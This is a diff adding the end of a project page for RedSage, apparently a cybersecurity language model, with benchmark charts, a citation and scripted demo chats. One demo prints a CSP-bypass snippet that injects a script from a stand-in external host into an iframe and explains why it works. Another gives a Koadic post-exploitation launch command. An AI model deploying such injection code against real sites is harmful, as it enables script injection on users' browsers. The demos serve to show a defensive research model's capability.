+                    <div class="glass p-6 rounded-xl border border-cyber-border">
+                        <h3 class="text-lg font-semibold mb-6 flex items-center gap-2">
+                            <i data-lucide="shield-check" class="text-blue-400"></i>
+                            Related Cybersecurity <br> Benchmarks (0-shot)
+                        </h3>
+
+                        <div class="space-y-4 font-mono text-sm">
+                            <!-- RedSage -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>RedSage-8B-Ins</span>
+                                    <span class="text-blue-400">81.30%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-gradient-to-r from-blue-500 to-cyan-400 h-2 rounded-full"
+                                        style="width: 81.30%"></div>
+                                </div>
+                            </div>
+                            <!-- Qwen3 -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Qwen3-8B</span>
+                                    <span class="text-cyber-muted">75.71%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/50 h-2 rounded-full" style="width: 75.71%"></div>
+                                </div>
+                            </div>
+                            <!-- Foundation-Sec -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Foundation-Sec-8B-Ins</span>
+                                    <span class="text-cyber-muted">75.44%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/30 h-2 rounded-full" style="width: 75.44%"></div>
+                                </div>
+                            </div>
+                            <!-- Llama-Primus -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-Primus-Base</span>
+                                    <span class="text-cyber-muted">71.69%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/20 h-2 rounded-full" style="width: 71.69%"></div>
+                                </div>
+                            </div>
+                            <!-- Llama-3.1 -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-3.1-8B-Ins</span>
+                                    <span class="text-cyber-muted">68.52%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/10 h-2 rounded-full" style="width: 68.52%"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <p class="text-[10px] text-cyber-muted mt-6 italic">
+                            *Mean accuracy across CTI-Bench (MCQ & RCM), CyberMetric (500), SecBench (En), SecEval,
+                            SECURE (CWET, KCV, MEAT), MMLU-CSec.
+                        </p>
+                    </div>
+
+                    <!-- Open LLM Leaderboard -->
+                    <div class="glass p-6 rounded-xl border border-cyber-border">
+                        <h3 class="text-lg font-semibold mb-6 flex items-center gap-2">
+                            <i data-lucide="globe" class="text-cyber-accent"></i>
+                            General Capabilities <br> (Open LLM Leaderboard)
+                        </h3>
+
+                        <div class="space-y-4 font-mono text-sm">
+                            <!-- RedSage -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>RedSage-8B-DPO</span>
+                                    <span class="text-cyber-accent">74.33%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-gradient-to-r from-cyber-accent to-yellow-500 h-2 rounded-full"
+                                        style="width: 74.33%"></div>
+                                </div>
+                            </div>
+                            <!-- Foundation -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Foundation-Sec-8B-Ins</span>
+                                    <span class="text-cyber-muted">69.28%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/50 h-2 rounded-full" style="width: 69.28%"></div>
+                                </div>
+                            </div>
+                            <!-- Llama 3.1 -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-3.1-8B-Ins</span>
+                                    <span class="text-cyber-muted">68.20%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/30 h-2 rounded-full" style="width: 68.2%"></div>
+                                </div>
+                            </div>
+                            <!-- Qwen3 -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Qwen3-8B-Ins</span>
+                                    <span class="text-cyber-muted">65.92%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/20 h-2 rounded-full" style="width: 65.92%"></div>
+                                </div>
+                            </div>
+                            <!-- Primus -->
+                            <div>
+                                <div class="flex justify-between mb-1">
+                                    <span>Llama-Primus-Base</span>
+                                    <span class="text-cyber-muted">64.82%</span>
+                                </div>
+                                <div class="w-full bg-cyber-border rounded-full h-2">
+                                    <div class="bg-cyber-muted/10 h-2 rounded-full" style="width: 64.82%"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <p class="text-[10px] text-cyber-muted mt-6 italic">
+                            *Mean accuracy across MMLU, ARC-C, GSM8K, HellaSwag, TQA, WinoGrande, IFEval.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Citation -->
+    <section class="py-20 bg-cyber-card/30">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-2xl font-bold mb-6">Citation</h2>
+            <div
+                class="glass p-6 rounded-lg font-mono text-sm overflow-x-auto border border-cyber-border/50 text-gray-300">
+                <pre>@inproceedings{suryanto2026redsage,
+  title={RedSage: A Cybersecurity Generalist {LLM}},
+  author={Suryanto, Naufal and Naseer, Muzammal and Li, Pengfei and Wasim, Syed Talal and Yi, Jinhui and Gall, Juergen and Ceravolo, Paolo and Damiani, Ernesto},
+  booktitle={Submitted to ICLR 2026},
+  year={2026},
+  url={https://openreview.net/forum?id=W4FAenIrQ2},
+  note={under review}
+}</pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-12 border-t border-cyber-border text-center text-cyber-muted text-sm">
+        <p>Built for the Open Cybersecurity Research Community.</p>
+        <div class="mt-4 flex justify-center gap-6">
+            <a href="https://huggingface.co/RISys-Lab"
+                class="hover:text-cyber-primary transition-colors">HuggingFace</a>
+            <a href="https://github.com/RISys-Lab/RedSage" class="hover:text-cyber-primary transition-colors">GitHub</a>
+        </div>
+    </footer>
+
+    <script>
+        // Init Lucide Icons
+        lucide.createIcons();
+
+        // Terminal Demo Logic
+        const scenarios = {
+            koadic: {
+                prompt: "Construct a command line to start Koadic with an autorun file named autorun_commands.txt and enable the restore option using restore_data.json.",
+                response: `<span class="text-cyber-primary">Here is the command line to start Koadic with the specified parameters:</span>
+
+<div class="bg-black/50 p-2 my-2 rounded border-l-2 border-cyber-primary">bash
+koadic --autorun autorun_commands.txt --restore restore_data.json
+</div>
+
+<span class="text-cyber-muted">### Explanation:</span>
+1. <span class="text-gray-300">--autorun autorun_commands.txt</span>: Specifies the file containing commands to execute on startup.
+2. <span class="text-gray-300">--restore restore_data.json</span>: Enables the restore feature using the specified JSON file for session data.
+
+<span class="text-yellow-500 italic">Note: Ensure koadic is in your system PATH or provide the full path to the executable.</span>`
+            },
+            olympic: {
+                prompt: "Which threat group is known to have used the Olympic Destroyer malware? Provide attribution details.",
+                response: `<span class="text-cyber-primary">Based on threat intelligence frameworks:</span>
+
+The threat group known to have used the Olympic Destroyer malware is <span class="text-white font-bold">Sandworm Team</span> (also known as Voodoo Bear, Iron Viking, or BlackEnergy).
+
+<span class="text-cyber-muted">### Key Details:</span>
+* <span class="text-gray-300">Affiliation:</span> Russian GRU (Main Intelligence Directorate).
+* <span class="text-gray-300">Incident:</span> Deployed against the 2018 Winter Olympics in Pyeongchang.
+* <span class="text-gray-300">TTPs:</span> The malware used destructive wiping capabilities, credential theft, and lateral movement via PsExec/WMI.
+
+<span class="text-red-400">Distinction:</span> Unlike Lazarus Group (DPRK) or APT28, Sandworm is specifically attributed to this disruptive campaign intended to sabotage the event.`
+            },
+            csp: {
+                prompt: `Analyze the provided code and identify the specific method used to bypass CSP protections. What makes this technique effective?
+
+<div class="bg-black/50 p-3 my-3 rounded border-l-2 border-cyber-accent font-mono text-xs text-gray-300 whitespace-pre-wrap">frame = document.createElement("iframe")
+frame.src="/css/bootstrap.min.css"
+document.body.appendChild(frame)
+script = document.createElement("script")
+script.src="//example.com/csp.js"
+window.frames[0].document.head.appendChild(script)</div>`,
+                response: `<span class="text-cyber-primary">The provided code bypasses Content Security Policy (CSP) protections through <strong>iframe injection</strong> by leveraging the following method:</span>
+
+<span class="text-cyber-muted">### Technique Breakdown:</span>
+1. <span class="text-gray-300">Iframe Creation:</span> An iframe is dynamically created using <code>document.createElement("iframe")</code>. The <code>src</code> is set to a benign resource (CSS) to avoid immediate blocking.
+2. <span class="text-gray-300">Script Injection:</span> The malicious script is injected into the <span class="text-red-400">iframe's document context</span> (<code>window.frames[0]...</code>) rather than the main page.
+
+<span class="text-cyber-muted">### Why This Works:</span>
+* <span class="text-white font-bold">Exploiting Iframe Isolation:</span> Iframes create a separate browsing context. By injecting the script into the iframe's document, the attack attempts to execute code within that fresh context.
+* <span class="text-white font-bold">CSP Inheritance Gaps:</span> If the main page's CSP <code>script-src</code> does not strictly enforce inheritance on dynamic iframes (or if the browser treats the <code>about:blank</code> or benign src context differently), the injected script at <code>//example.com/csp.js</code> may execute despite parent restrictions.`
+            }
+        };
+
+        const terminalContent = document.getElementById('terminal-content');
+
+        function typeWriter(text, element, speed = 10) {
+            let i = 0;
+            element.innerHTML = '';
+            function type() {
+                if (i < text.length) {
+                    element.innerHTML += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                }
+            }
+            type();
+        }
+
+        function loadScenario(type) {
+            // Update buttons
+            document.querySelectorAll('button[id^="btn-"]').forEach(btn => {
+                btn.classList.remove('bg-cyber-border', 'border-transparent');
+                btn.classList.add('bg-transparent', 'border-cyber-border');
+            });
+            const activeBtn = document.getElementById(`btn-${type}`);
+            activeBtn.classList.remove('bg-transparent');
+            activeBtn.classList.add('bg-cyber-border');
+
+            // Clear terminal
+            terminalContent.innerHTML = '';
+
+            // 1. User Prompt Animation
+            const userDiv = document.createElement('div');
+            // Added items-start to align arrow to top for multiline prompts
+            userDiv.className = 'flex gap-2 items-start text-cyber-muted opacity-0 transition-opacity duration-300';
+            // Changed prompt container to div to allow block elements
+            userDiv.innerHTML = `<span class="text-cyber-primary mt-0.5">❯</span> <div class="text-white">${scenarios[type].prompt}</div>`;
+            terminalContent.appendChild(userDiv);
+
+            requestAnimationFrame(() => userDiv.classList.remove('opacity-0'));
+
+            // 2. Loading State
+            setTimeout(() => {
+                const loader = document.createElement('div');
+                loader.id = 'loader';
+                loader.className = 'flex gap-2 items-center text-cyber-primary text-xs font-mono mt-2';
+                loader.innerHTML = `<span>Answering</span><span class="animate-pulse">...</span>`;
+                terminalContent.appendChild(loader);
+
+                // 3. Response
+                setTimeout(() => {
+                    loader.remove();
+                    const responseDiv = document.createElement('div');
+                    responseDiv.className = 'mt-2 text-gray-300 leading-relaxed whitespace-pre-wrap opacity-0 transition-opacity duration-500';
+                    responseDiv.innerHTML = scenarios[type].response;
+                    terminalContent.appendChild(responseDiv);
+                    requestAnimationFrame(() => responseDiv.classList.remove('opacity-0'));
+                }, 1200); // Fake latency
+            }, 600);
+        }
+
+        // Initialize first scenario
+        loadScenario('koadic');
+    </script>
+</body>
+
+</html>
